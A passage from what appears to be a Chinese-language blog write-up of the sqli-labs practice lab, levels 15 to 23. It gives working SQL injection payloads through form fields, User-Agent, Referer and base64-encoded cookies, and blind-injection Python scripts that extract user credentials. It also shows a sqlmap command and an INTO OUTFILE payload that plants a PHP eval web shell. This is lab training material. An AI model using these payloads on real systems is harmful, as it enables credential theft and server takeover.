srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-15-POST-布尔盲注"><a href="#Less-15-POST-布尔盲注" class="headerlink" title="Less-15 POST 布尔盲注"></a>Less-15 POST 布尔盲注</h2><p>验证注入点：万能密码登录成功 → uname=0x74617269’ or 1=1 #&amp;passwd=1<br />利用闭合方式：<code>uname=admin&#39; &lt;payload&gt; #&amp;passwd=1</code><br />要确保 0x74617269 是不存在的，因为用的是 <code>or</code>, 如果 <code>uname</code> 是存在的就用 <code>and</code></p><p>获取数据库长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">0x74617269</span><span class="string">&#x27; or length(database()) = 8 #&amp;passwd=1</span></span><br></pre></td></tr></table></figure><h3 id="获取数据-4"><a href="#获取数据-4" class="headerlink" title="获取数据"></a>获取数据</h3><p>查询表的字段个数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">0x74617269</span><span class="string">&#x27; or (select count(*) from emails) = 8 #&amp;passwd=1</span></span><br></pre></td></tr></table></figure><p>获取第一个字段数据长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">0x74617269</span><span class="string">&#x27; or (select length(email_id) from emails limit 0,1) = 16 #&amp;passwd=1</span></span><br></pre></td></tr></table></figure><p>获取第一个字段数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 第一个字段第一个字母是 D</span><br><span class="line">uname<span class="operator">=</span><span class="number">0x74617269</span><span class="string">&#x27; or ascii(substr((select email_id from emails limit 0,1),1,1)) = 68 #&amp;passwd=1</span></span><br></pre></td></tr></table></figure><p>写个脚本获取这个字段所有 16 个字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://localhost:8890/sqli-labs/Less-15/&quot;</span></span><br><span class="line">    data_template = &#123;</span><br><span class="line">        <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;0x74617269\&#x27; or ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1)) = &#123;1&#125; #&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chars = <span class="string">&#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = <span class="built_in">ord</span>(char)</span><br><span class="line">            data[<span class="string">&#x27;uname&#x27;</span>] = data_template[<span class="string">&#x27;uname&#x27;</span>].<span class="built_in">format</span>(i,char_ascii)</span><br><span class="line">            response = requests.post(url, data)</span><br><span class="line">            length = <span class="built_in">len</span>(response.text)</span><br><span class="line">            <span class="comment">#返回的长度等于 1447 就中了</span></span><br><span class="line">            <span class="keyword">if</span> length &gt; <span class="number">1447</span>:</span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997832.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997832.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-16-POST-布尔盲注"><a href="#Less-16-POST-布尔盲注" class="headerlink" title="Less-16 POST 布尔盲注"></a>Less-16 POST 布尔盲注</h2><p>验证注入点：万能密码登录成功 → uname=admin”) or 1=1#&amp;passwd=1<br />利用闭合方式：<code>uname=</code>0x74617269<code>&quot;) &lt;payload&gt; #&amp;passwd=1</code><br />获取数据库长度</p><p>POST</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">0x74617269</span>&quot;) or length(database()) = 8 #&amp;passwd=1</span><br></pre></td></tr></table></figure><p>获取第一个字段数据 16 个字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>():</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://localhost:8890/sqli-labs/Less-16/&quot;</span></span><br><span class="line">    data_template = &#123;</span><br><span class="line">        <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;0x74617269&quot;) or ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1)) = &#123;1&#125; #&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    chars = <span class="string">&#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = <span class="built_in">ord</span>(char)</span><br><span class="line">            data[<span class="string">&#x27;uname&#x27;</span>] = data_template[<span class="string">&#x27;uname&#x27;</span>].<span class="built_in">format</span>(i,char_ascii)</span><br><span class="line">            response = requests.post(url, data)</span><br><span class="line">            length = <span class="built_in">len</span>(response.text)</span><br><span class="line">            <span class="comment">#返回的长度等于 1504 就中了</span></span><br><span class="line">            <span class="keyword">if</span> length &gt; <span class="number">1503</span>:</span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">get_data()</span><br></pre></td></tr></table></figure><h2 id="Less-17-UPDATE-报错注入"><a href="#Less-17-UPDATE-报错注入" class="headerlink" title="Less-17 UPDATE 报错注入"></a>Less-17 UPDATE 报错注入</h2><p>uname 输入点被转义，update需要一个存在的用户，即 uname 必须是在数据库中存在的。<br />注入点在 passwd 字段<br />验证注入点：uname=admin&amp;passwd=1’<br />利用闭合方式：<code>uname=Dhakkan&amp;passwd=1&#39; &lt;payload&gt; #</code></p><p>POST</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>Dhakkan<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span></span><br></pre></td></tr></table></figure><p>正常报错注入获取数据库<br /><img src="/img/sqli-labs/clip_image001-7997851.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997851.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>但在获取数据就有点问题了</p><p>POST</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>Dhakkan<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)#</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997858.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997858.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>报错: You can’t specify target table ‘users’ for update in FROM clause<br />参考：<a href="https://blog.csdn.net/fdipzone/article/details/52695371">https://blog.csdn.net/fdipzone/article/details/52695371</a></p><p>在 MySQL 中，不能在同一个sql语句中，先select同一个表的某些值，然后再update这个表。<br />但 select 的结果可以再通过一个中间表 select 多一次，就可以避免这个错误。<br />顺便还明白了，为什么 sqlmap 的 payload 中那么多个 <code>as</code></p><p>因此重新构造</p><p>POST</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>Dhakkan<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,</span></span><br><span class="line"><span class="string">    (select concat(id,username,password) from (select * from users limit 0,1) as res)</span></span><br><span class="line"><span class="string">,0x7e),1)#</span></span><br></pre></td></tr></table></figure><p>获取成功</p><p><img src="/img/sqli-labs/clip_image001-7997879.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997879.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-18-HTTP头UA-INSERT-报错注入"><a href="#Less-18-HTTP头UA-INSERT-报错注入" class="headerlink" title="Less-18 HTTP头UA INSERT 报错注入"></a>Less-18 HTTP头UA INSERT 报错注入</h2><p>需要正确的帐号密码<br />验证注入点：User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4208.0 Safari/537.36<code>&#39;</code><br />利用闭合方式：1’ AND  AND ‘</p><p><strong>PHP 里用来获取客户端 IP 的变量</strong></p><ul><li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 这个很少使用，不一定服务器都实现了。客户端可以伪造。</li><li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li><li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li></ul><p>不过这里有个很奇怪的地方</p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="operator">/</span><span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_15_7) AppleWebKit<span class="operator">/</span><span class="number">537.36</span> (KHTML, <span class="keyword">like</span> Gecko) Chrome<span class="operator">/</span><span class="number">86.0</span><span class="number">.4208</span><span class="number">.0</span> Safari<span class="operator">/</span><span class="number">537.361</span><span class="string">&#x27; AND updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),1) AND &#x27;</span></span><br></pre></td></tr></table></figure><p>即 默认UA + 利用，但非预期内报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Truncated incorrect <span class="keyword">DOUBLE</span> <span class="keyword">value</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4208.0 Safari/537.361&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997889.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997889.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>把 UA 换成数字，不一定是1，0以外的数字基本都可以<br />可以成功利用报错注入</p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="number">1</span><span class="string">&#x27; AND updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),1) AND &#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997897.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997897.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>但如果把 1 换成 0，就什么都不输出了。<br /></p><p><img src="/img/sqli-labs/clip_image001-7997909.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997909.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><p>也就是说，UA <code>&#39;</code> 前包含 正负数字以外 的都不行<br />不是很理解为啥<br />爆破数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="number">1</span><span class="string">&#x27; AND updatexml(1,concat(0x7e,(select concat(id,username,password) from users limit 0,1),0x7e),1) AND &#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Less-19-HTTP头Referer-INSERT-报错注入"><a href="#Less-19-HTTP头Referer-INSERT-报错注入" class="headerlink" title="Less-19 HTTP头Referer INSERT 报错注入"></a>Less-19 HTTP头Referer INSERT 报错注入</h2><p>需要正确的帐号密码<br />验证注入点：Referer: <a href="http://sqli-labs:8890/sqli-labs/Less-19/">http://sqli-labs:8890/sqli-labs/Less-19/</a><code>&#39;</code><br />利用闭合方式：Referer: <a href="http://sqli-labs:8890/sqli-labs/Less-19/">http://sqli-labs:8890/sqli-labs/Less-19/</a>‘ AND  AND ‘</p><p>爆破数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="number">9</span><span class="string">&#x27; AND updatexml(1,concat(0x7e,(select concat(id,username,password) from users limit 0,1),0x7e),1) AND &#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Less-20-HTTP头Cookie-联合注入"><a href="#Less-20-HTTP头Cookie-联合注入" class="headerlink" title="Less-20 HTTP头Cookie 联合注入"></a>Less-20 HTTP头Cookie 联合注入</h2><p>验证注入点：Cookie: uname=123<code>&#39;</code><br />利用闭合方式：Cookie: uname=123<code>&#39;#</code></p><p>可以直接用联合注入</p><p>提取本表字段，到 4 刚刚好报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span><span class="number">123</span><span class="string">&#x27; and 1=2 order by 4#</span></span><br></pre></td></tr></table></figure><p>获取表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span><span class="number">123</span><span class="string">&#x27; and 1=2 union select 1,(select group_concat(table_name separator 0x3c62723e) from information_schema.tables where table_schema=database()),3#</span></span><br></pre></td></tr></table></figure><p>获取字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span><span class="number">123</span><span class="string">&#x27; and 1=2 union select 1,(select group_concat(column_name separator 0x3c62723e) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),3#</span></span><br></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span><span class="number">123</span><span class="string">&#x27; and 1=2 union select 1,(select group_concat(username separator 0x3c62723e) from security.users),(select group_concat(password separator 0x3c62723e) from security.users)#</span></span><br></pre></td></tr></table></figure><p><img src="/img/sqli-labs/clip_image001-7997924.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997924.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-21-Dump-into-outfile"><a href="#Less-21-Dump-into-outfile" class="headerlink" title="Less-21 Dump into outfile"></a>Less-21 Dump into outfile</h2><p>验证注入点：Cookie: uname=MSc=<br />（其中 <code>MSc=</code> 为 <code>1&#39;</code> 的 base64编码）<br />利用闭合方式：Cookie: uname=MScpIG9yIDE9MSAj<br />（其中 <code>MScpIG9yIDE9MSAj</code> 为 <code>1&#39;) or 1=1 #</code> 的 base64编码 ）</p><p>注意事项</p><blockquote><p>这里不能直接用 –+ ，因为是经过base64编码传输的，解码后传入数据库执行的是 –+，并不会转换为 –空格， –+ MySQL是不认识的，会报错</p></blockquote><p>先判断表字段数，3正常，4报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;) order by 4#</span></span><br></pre></td></tr></table></figure><p>因后端有base64解码，所以需要编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MScpIG9yZGVyIGJ5IDQj</span><br></pre></td></tr></table></figure><p>写文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;) union select null,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e,null into outfile &#x27;</span><span class="operator">/</span>Users<span class="operator">/</span>tari<span class="operator">/</span>Sites<span class="operator">/</span>tari_local<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-21</span><span class="operator">/</span>tari.php<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>base64编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MScpIHVuaW9uIHNlbGVjdCBudWxsLDB4M2MzZjcwNjg3MDIwNjU3NjYxNmMyODI0NWY1MDRmNTM1NDViMjc3MDc3NjQyNzVkMjkzYjNmM2UsbnVsbCBpbnRvIG91dGZpbGUgJy9Vc2Vycy90YXJpL1NpdGVzL3RhcmlfbG9jYWwvc3FsaS1sYWJzL0xlc3MtMjEvdGFyaS5waHAnIw==</span><br></pre></td></tr></table></figure><p>报错不要紧因为这个语句值返回空<br /></p><p><img src="/img/sqli-labs/clip_image001-7997938.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997938.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img">可以正常利用<br /><img src="/img/sqli-labs/clip_image001-7997943.png" class="lazyload" data-srcset="/img/sqli-labs/clip_image001-7997943.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h2 id="Less-21-Cookie联合注入"><a href="#Less-21-Cookie联合注入" class="headerlink" title="Less-21 Cookie联合注入"></a>Less-21 Cookie联合注入</h2><p>注入点、闭合方式和判断表字段数同 Less-21 Dump into outfile 一致<br>这里尝试获取数据，与 Less-20 类似，不过要base64编码一下，然后闭合方式不一样</p><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;) and 1=2 union select 1,(select group_concat(username separator 0x3c62723e) from security.users),(select group_concat(password separator 0x3c62723e) from security.users)#</span></span><br></pre></td></tr></table></figure><p>base64编码一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=MTIzJykgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSBzZXBhcmF0b3IgMHgzYzYyNzIzZSkgZnJvbSBzZWN1cml0eS51c2VycyksKHNlbGVjdCBncm91cF9jb25jYXQocGFzc3dvcmQgc2VwYXJhdG9yIDB4M2M2MjcyM2UpIGZyb20gc2VjdXJpdHkudXNlcnMpIw==</span><br></pre></td></tr></table></figure><p>![](/img/sqli-labs/Pasted image 20210703153244.png)</p><p>可以尝试使用 sqlmap base64encode tamper</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://tari.local:8890/sqli-labs/Less-21/&quot;</span> --cookie=<span class="string">&quot;uname=*&quot;</span> --tamper=<span class="string">&quot;base64encode&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</span><br></pre></td></tr></table></figure><ul><li><code>--flush-session</code> 选项是清除本地的缓存，因为sqlmap扫描结果会在本地缓存，然后下次扫描如果存在缓存会直接调用已扫描的结果。</li></ul><h2 id="Less-22-Cookie联合注入"><a href="#Less-22-Cookie联合注入" class="headerlink" title="Less-22 Cookie联合注入"></a>Less-22 Cookie联合注入</h2><p>验证注入点：Cookie: uname=MTIzIg==<br>（其中 <code>MTIzIg==</code> 为 <code>1&quot;</code> 的 base64编码）<br>利用闭合方式：Cookie: uname=MTIzIiBvciAxPTEj<br>（其中 <code>MTIzIiBvciAxPTEj</code> 为 <code>123&quot; or 1=1#</code> 的 base64编码 ）</p><p>利用方式和Less-21类似，只不过闭合方式不同</p><p>判断表字段个数，3正常，4报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&quot; order by 4#</span><br></pre></td></tr></table></figure><p>base64编码一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=MSIgb3JkZXIgYnkgNCM=</span><br></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&quot; and 1=2 union select 1,(select group_concat(username,password separator 0x3c62723e) from security.users),3#</span><br></pre></td></tr></table></figure><p>base64编码一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uname=MSIgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCBzZXBhcmF0b3IgMHgzYzYyNzIzZSkgZnJvbSBzZWN1cml0eS51c2VycyksMyM=</span><br></pre></td></tr></table></figure><p>![](/img/sqli-labs/Pasted image 20210703164129.png)</p><p>突然发现好像数据都连在一起了，通过 concat 加个间隔符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&quot; and 1=2 union select 1,(select group_concat(concat_ws(0x3a, username,password) separator 0x3c62723e) from security.users),3#</span><br></pre></td></tr></table></figure><p>![](/img/sqli-labs/Pasted image 20210703164423.png)<br>舒服了~</p><h2 id="Less-23-GET注入-过滤注释符"><a href="#Less-23-GET注入-过滤注释符" class="headerlink" title="Less-23 GET注入 过滤注释符"></a>Less-23 GET注入 过滤注释符</h2><p>验证注入点：id=1’</p><p>利用闭合方式：?id=1’ and 1=2 union select 1,2,3 ‘</p><p>因为本关过滤了注释符，其他都差不多</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = preg_replace(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span 